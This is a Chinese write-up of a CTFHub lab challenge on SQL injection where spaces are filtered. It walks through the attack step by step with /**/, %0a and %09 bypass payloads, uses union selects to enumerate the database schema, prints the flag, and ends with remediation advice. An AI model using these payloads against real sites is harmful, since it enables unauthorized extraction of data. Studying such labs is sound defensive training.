# CTFHub Writeup - 过滤空格

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - 过滤空格 |
| 靶场地址 | `http://challenge-884271202df8aa2a.sandbox.ctfhub.com:10800` |
| 注入参数 | GET `id` |
| 过滤规则 | 空格（URL 解码后）→ 回显 `Hacker!!!` |
| 绕过方式 | `/**/`、`%0a`、`%09` |
| 数据库 | `sqli`（MariaDB 10.3.22） |
| 表 / 字段 | `urleahbmud` / `uqvexuqxne`（随机名） |
| Flag | `ctfhub{0316e0189440bbb9e93a158e}` |
## 0x02 漏洞原理
这题本身还是普通的 union 注入，难点在于服务端**把空格过滤掉了**。
空格在 SQL 里是最重要的分隔符，`select * from news where id=1` 全靠空格把关键字分开。很多简陋的防护就只做一件事：把输入里的空格删掉或者直接拦截，以为这样就能防住注入。
但在 MySQL 里，**注释 `/**/` 和空白是等价的**。也就是说：
```sql
select * from news where id=1 and 1=1
```
可以写成：
```sql
select * from news where id=1/**/and/**/1=1
```
`/**/` 在词法分析时被当成注释丢弃，但它起到的「把两个 token 隔开」的作用和空格完全一样，所以语句依然合法，注入照样成立。
除了 `/**/`，还有几种常见的替代：
- `%0a`：换行符；
- `%09`：制表符；
- `%0d`：回车符；
- 括号：某些位置可以用 `union(select(...))` 这种写法绕开空格。
所以「过滤空格」只能挡住最粗略的自动化扫描，挡不住手工构造的 payload。
## 0x03 解题过程
**3.1 找注入点**
先正常访问：
```
?id=1
```
页面在表单下面回显：
```
ID: 1
Data: ctfhub
```
换成单引号：
```
?id=1'
```
`ID` 和 `Data` 都不见了，说明单引号破坏了 SQL 语法，`id` 存在注入。注意这题页面**不回显执行的 SQL 语句**，只能靠 `ID` / `Data` 有没有出现来判断。
**3.2 确认空格被过滤**
直接用空格拼一个条件：
```
?id=1%20and%201=1
```
页面回显：
```
Hacker!!!
```
换成 `+`（URL 里 `+` 会被解码成空格）：
```
?id=1+and+1=1
```
结果一样是 `Hacker!!!`。说明服务端是在 **URL 解码之后** 检查空格的，`%20` 和 `+` 都逃不掉。
**3.3 用 `/**/` 代替空格**
把空格全部换成注释：
```
?id=1/**/and/**/1=1
```
页面恢复正常的 `ID: 1` / `Data: ctfhub`，说明绕过成功。
**3.4 判断列数**
同样用 `/**/` 代替空格：
```
?id=1/**/order/**/by/**/1
?id=1/**/order/**/by/**/2
?id=1/**/order/**/by/**/3
```
前两个正常，`order by 3` 无回显，说明原查询是 **2 列**。
**3.5 占住回显位**
```
?id=-1/**/union/**/select/**/1,2
```
回显：
```
ID: 1
Data: 2
```
两个位置都能用，后面把要查的内容放在第 1 列。
**3.6 查库名和版本**
```
?id=-1/**/union/**/select/**/database(),version()
```
```
ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1
```
当前库是 `sqli`。顺便看连接用户：
```
?id=-1/**/union/**/select/**/user(),@@version_compile_os
ID: root@localhost
Data: debian-linux-gnu
```
**3.7 查表名和字段名**
查当前库的表：
```
?id=-1/**/union/**/select/**/group_concat(table_name),2/**/from/**/information_schema.tables/**/where/**/table_schema=database()
```
回显：
```
ID: urleahbmud,news
```
flag 在随机表 `urleahbmud` 里。继续查字段：
```
?id=-1/**/union/**/select/**/group_concat(column_name),2/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='urleahbmud'
```
回显：
```
ID: uqvexuqxne
```
**3.8 取 flag**
```
?id=-1/**/union/**/select/**/uqvexuqxne,2/**/from/**/urleahbmud/**/limit/**/0,1
```
回显：
```
ID: ctfhub{0316e0189440bbb9e93a158e}
Data: 2
```
拿到 Flag：
```
ctfhub{0316e0189440bbb9e93a158e}
```
**3.9 验证**
先看长度：
```
?id=-1/**/union/**/select/**/concat('LEN=',length(uqvexuqxne)),2/**/from/**/urleahbmud/**/limit/**/0,1
-> LEN=32
```
再把 flag 的十六进制部分拿出来做精确匹配，这样就不用在 URL 里写 `{}`：
```
?id=-1/**/union/**/select/**/substr(uqvexuqxne,8,24),2/**/from/**/urleahbmud/**/where/**/substr(uqvexuqxne,8,24)='0316e0189440bbb9e93a158e'
-> 0316e0189440bbb9e93a158e
```
也可以用 `like` 加十六进制字面量匹配前缀 `ctfhub{`：
```
?id=-1/**/union/**/select/**/uqvexuqxne,2/**/from/**/urleahbmud/**/where/**/uqvexuqxne/**/like/**/0x6374666875627b25
-> ctfhub{0316e0189440bbb9e93a158e}
```
长度 32、十六进制段一致、前缀匹配通过，说明 flag 正确。
**3.10 其它替代符**
除了 `/**/`，换行和制表符同样可以当空格用：
```
?id=-1%0aunion%0aselect%0a1,2   -> ID: 1 / Data: 2
?id=-1%09union%09select%091,2   -> ID: 1 / Data: 2
```
## 0x04 完整流程
| 步骤 | 语句（空格用 `/**/` 代替） | 结果 |
| --- | --- | --- |
| 找注入点 | `id=1'` | 回显消失 |
| 确认过滤 | `id=1%20and%201=1` | `Hacker!!!` |
| 绕过 | `id=1/**/and/**/1=1` | 正常回显 |
| 列数 | `order/**/by/**/1/2/3` | 2 列 |
| 库名 | `union/**/select/**/database(),version()` | `sqli` |
| 表名 | `group_concat(table_name)` | `urleahbmud,news` |
| 字段名 | `group_concat(column_name)` | `uqvexuqxne` |
| flag | `select uqvexuqxne from urleahbmud` | `ctfhub{0316e0189440bbb9e93a158e}` |
整条链路可以概括为：**把每个空格换成 `/**/`，其余步骤和普通 union 注入完全一样。**
## 0x05 踩坑记录
1. **`+` 也会被拦**：URL 里的 `+` 会被解码成空格，服务端检测的是解码后的值，所以 `1+and+1=1` 一样回显 `Hacker!!!`，别以为换一种「不用 `%20`」的写法就能过。
2. **原始空格连请求都发不出去**：直接把空格写进 URL（`?id=1 and 1=1`），curl 会报错或者服务器返回 400，浏览器则会自动编码。正确做法是先编码或者直接用 `/**/`。
3. **不是所有位置都能省空格**：`union/**/select` 必须有分隔，否则会变成 `unionselect` 这种非法 token；`limit 0,1` 也要写成 `limit/**/0,1`。
4. **`/**/` 里不能加空格**：`/* */` 中间带空格等于又引入了空格，会被拦；必须写成紧凑的 `/**/`。
5. **URL 里不要出现 `{}`**：验证 flag 时如果直接把 `ctfhub{...}` 写进 URL，openresty 会拒绝这种非法字符，返回空。改用 `substr()` 只比对十六进制部分，或者用 `0x...` 十六进制字面量。
6. **页面不回显 SQL**：和前几题不同，这题只显示 `ID` / `Data`，看不到实际执行的语句。调试时要靠回显判断 payload 是否生效，必要时把 `id` 换成 `-1` 看结果。
7. **过滤可能只针对 GET**：如果换到 Cookie、POST 或 Header，过滤规则不一定相同，实战中要多换几个位置试。
## 0x06 修复建议
1. **不要用黑名单过滤空格**：空格有太多替代写法（`/**/`、`%0a`、`%09`、括号），这种防护形同虚设，只能挡住最粗的扫描器。
2. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 `id` 作为参数绑定，注入从根上消失。这是唯一可靠的做法。
3. **对输入做类型校验**：`id` 应该是整数，用 `intval()` 强转或正则限制为纯数字。
4. **关闭详细报错**：`display_errors=Off`，错误只写日志，不返回给前端。
5. **最小权限**：Web 应用不要用 root 连库，只授予业务所需的 `SELECT` 权限。
6. **WAF 兜底**：对 `union`、`information_schema`、`/**/` 等特征做检测，但要清楚 WAF 只是补充，不能替代参数化查询。
## 0x07 总结
「过滤空格」是 SQL 注入里最经典的绕过题之一。
它考察的其实是一个语法细节：**注释 `/**/` 在 MySQL 里等价于空白**。只要理解这一点，把 payload 里每个空格换成 `/**/`，剩下的步骤和普通 union 注入一模一样。
反过来看，这题也说明了黑名单过滤的局限：攻击者只要找到一种「不写空格但语法合法」的表达方式，防护就失效了。真正可靠的防御只有参数化查询。
